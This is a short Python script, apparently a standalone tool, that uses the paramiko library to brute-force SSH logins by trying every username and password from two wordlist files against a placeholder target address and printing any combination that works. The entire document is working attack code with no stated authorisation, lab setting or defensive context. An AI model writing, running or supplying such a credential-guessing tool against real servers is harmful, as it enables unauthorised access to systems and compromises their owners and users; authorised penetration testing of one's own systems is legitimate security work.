import paramiko
import socket

def check_ssh_login(ip, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        print(f"Attempting Username: {username}, Password: {password}")
        client.connect(ip, username=username, password=password, timeout=5)
        print(f'[VALID] Username: {username}, Password: {password}')
        return True
    except paramiko.AuthenticationException:
        # Authentication failed
        print(f'[INVALID] Authentication failed for Username: {username}, Password: {password}')
        return False
    except paramiko.SSHException as e:
        # Handle other SSH exceptions
        print(f'[ERROR] SSHException for Username: {username}, Password: {password}: {e}')
        return False
    except socket.error as e:
        # Handle network-related errors
        print(f'[ERROR] Socket error for Username: {username}, Password: {password}: {e}')
        return False
    except Exception as e:
        # Handle any other unexpected errors
        print(f'[ERROR] Unexpected error for Username: {username}, Password: {password}: {e}')
        return False
    finally:
        client.close()

if __name__ == "__main__":
    target_ip = '<target-ip>'
    
    # Read usernames
    with open('users.txt', 'r') as user_file:
        usernames = [line.strip() for line in user_file if line.strip()]
    
    # Read passwords
    with open('passwords.txt', 'r') as pass_file:
        passwords = [line.strip() for line in pass_file if line.strip()]

    # Test each username-password combination
    for username in usernames:
        for password in passwords:
            check_ssh_login(target_ip, username, password)
